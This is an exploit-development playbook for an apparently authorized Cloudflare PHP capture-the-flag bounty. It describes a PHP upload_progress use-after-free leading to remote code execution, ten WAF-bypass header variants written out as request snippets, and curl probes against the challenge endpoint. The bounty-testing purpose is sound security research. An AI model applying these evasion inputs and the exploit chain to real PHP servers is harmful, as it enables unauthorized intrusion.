# Cloudflare PHP CTF — Exploit Development Playbook

**Target:** POST https://php-rce.cloudflare.app/php/* only  
**Bounty:** $3,000 per materially unique WAF-bypass RCE report  
**Status:** Campaign open (verified 2026-10-30 16:20 MDT). WAF hardened by prior submissions.  
**Scope authorization:** Explicitly authorized by Cloudflare (challenge page + HackerOne program).  
**Gregg's word:** Pursuit authorized 2026-10-30 ~16:55 MDT. Submission takes his explicit word.

## Target Stack
- PHP 8.5.11 (vulnerable, unpatched for CVE-2026-109618/109619)
- Apache 2 via mod_php
- Empty index.php in Cloudflare Container
- Cloudflare WAF with default PHP2Shell rules (7x "Anomalous Execution" + response-phase rule)
- Flag at /flag inside sandbox, resets every few minutes

## Vulnerability: CVE-2026-109619 (upload_progress UAF)
The reliable path. Located in `php_session_rfc1867_callback` (ext/session/session.c).

**Mechanism:**
1. Attacker sends multipart POST with field `PHP_SESSION_UPLOAD_PROGRESS` (default name) BEFORE a file part
2. PHP caches two `zval*` pointers (`post_bytes_processed`, `current_file_bytes_processed`) into HashTables
3. Second request triggers session re-read → `zend_hash_update` destroys HashTable via `zval_ptr_dtor`
4. Freed memory reclaimed and controlled by attacker
5. Attacker places controlled `zend_fcall_info` / `zend_internal_function` at reclaimed address
6. Dangling pointer use reaches `zend_call_function` → redirected to `system()` or equivalent

**Requirements:**
- Field name must match `session.upload_progress.name` (default: `PHP_SESSION_UPLOAD_PROGRESS`)
- Field must appear BEFORE a file upload part in the multipart body
- Valid session (PHPSESSID cookie)
- Per-build heap offset (wrong offset = segfault = dropped connection on mod_php)

## WAF Behavior (confirmed by probing)
- Literal `PHP_SESSION_UPLOAD_PROGRESS` in body → **403 blocked**
- Same request without the field → **200 allowed**
- WAF is doing string/regex matching on the raw request body
- Response-phase rule also active (inspects origin responses)

## The Bypass: Parser Differentials
The WAF sees the raw bytes. PHP's rfc1867 parser interprets them. Find inputs where:
- WAF's pattern match FAILS to find `PHP_SESSION_UPLOAD_PROGRESS`
- PHP's parser STILL extracts the field name as `PHP_SESSION_UPLOAD_PROGRESS`

### Technique 1: Content-Disposition Case Variation
HTTP header field names are case-insensitive per RFC 7230. Test if WAF regex is case-sensitive.
```
Content-disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"
content-DISPOSITION: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"
```

### Technique 2: Whitespace Around `=`
RFC 7231 allows optional whitespace around parameter delimiters. Test PHP's tolerance vs WAF's.
```
Content-Disposition: form-data; name = "PHP_SESSION_UPLOAD_PROGRESS"
Content-Disposition: form-data; name= "PHP_SESSION_UPLOAD_PROGRESS"
Content-Disposition: form-data ; name="PHP_SESSION_UPLOAD_PROGRESS"
```

### Technique 3: Unquoted Parameter Value
RFC 7578 allows both quoted and unquoted values. Test if WAF regex requires quotes.
```
Content-Disposition: form-data; name=PHP_SESSION_UPLOAD_PROGRESS
```

### Technique 4: Parameter Order Swap
If WAF regex expects `name` before `filename`, swapping may bypass.
```
Content-Disposition: form-data; filename="test.txt"; name="PHP_SESSION_UPLOAD_PROGRESS"
```

### Technique 5: Duplicate Name Parameters
RFC doesn't forbid duplicates. PHP likely takes first or last; WAF may only check one.
```
Content-Disposition: form-data; name="decoy"; name="PHP_SESSION_UPLOAD_PROGRESS"
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"; name="decoy"
```

### Technique 6: Header Line Folding (RFC 822)
Long headers can be folded across lines with leading whitespace on continuation.
```
Content-Disposition: form-data;
 name="PHP_SESSION_UPLOAD_PROGRESS"
```

### Technique 7: Boundary Quoting Differential
If WAF and PHP disagree on boundary parsing, WAF may fail to parse multipart structure.
```
Content-Type: multipart/form-data; boundary="----WebKitFormBoundaryABC123"
```
vs unquoted. If WAF expects one format and PHP handles both, the WAF may not identify part boundaries.

### Technique 8: Mixed Line Endings
Multipart spec uses CRLF. Test LF-only or mixed.
- Some parsers are strict (WAF), some are lenient (PHP)

### Technique 9: Trailing Semicolon / Empty Parameters
```
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS";
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"; foo=bar
```

### Technique 10: CVE-2026-109618 (OOM Path — No Upload Field)
If WAF is entirely focused on the upload_progress string, the OOM corruption path
doesn't use that field at all. Requires:
- Single oversized request to trigger OOM during request setup
- ASLR defeat (harder, but a "materially distinct" method if it works)
- Different WAF evasion surface entirely

## Testing Methodology
1. For each technique, send a probe with a BENIGN field value (not exploit payload)
2. 200 = WAF bypassed the detection. 403 = WAF caught it.
3. For each 200, verify PHP actually parsed the field (check if upload progress tracking activated — response headers or session behavior)
4. Only after confirming PHP parses a WAF-invisible field, build the RCE chain
5. RCE chain: heap grooming → UAF trigger → control zend_fcall_info → system("/flag" read) → exfiltrate via response
6. Verify flag through CTF UI immediately (sandbox resets every few minutes)
7. Save: attempt ID, UTC timestamps, raw request/response, UI verification screenshot

## Baseline Probe (WAF-allowed, no trigger)
```bash
curl -i 'https://php-rce.cloudflare.app/php/index.php' \
  --form 'upload=@./test.bin;filename="test.txt"'
```
Expected: 200, empty body, X-Powered-By: PHP/8.5.11

## Detection Probe (WAF-blocked, confirms rule)
```bash
curl -i 'https://php-rce.cloudflare.app/php/index.php' \
  --form-string 'PHP_SESSION_UPLOAD_PROGRESS=test123' \
  --form 'upload=@./test.bin;filename="test.txt"'
```
Expected: 403 (WAF blocks literal field name)

## Submission Requirements (from CTF page)
1. HackerOne account + agree to Bounty Terms BEFORE testing
2. Demonstrate RCE through authorized POST
3. Recover /flag, verify through CTF UI promptly
4. Private HackerOne report with "PHP CTF" in title including:
   - Endpoint, complete payload, request sequence (headers, encoding, body bytes)
   - Raw captures or reproducible PoC
   - WAF bypass explanation + executed code + flag recovery method
   - Attempt ID, UI verification result, UTC timestamps
   - What makes it materially distinct + related submissions known
5. File disclosure without RCE, RCE without flag recovery, rediscovery of known CVEs, partial chains = NOT eligible

## Notes
- Sandbox resets every few minutes — move fast from RCE to flag recovery to UI verification
- Use test data only — Cloudflare records all payloads and publishes successful ones
- If 429 or 503: back off immediately
- Do NOT touch anything outside POST php-rce.cloudflare.app/php/*
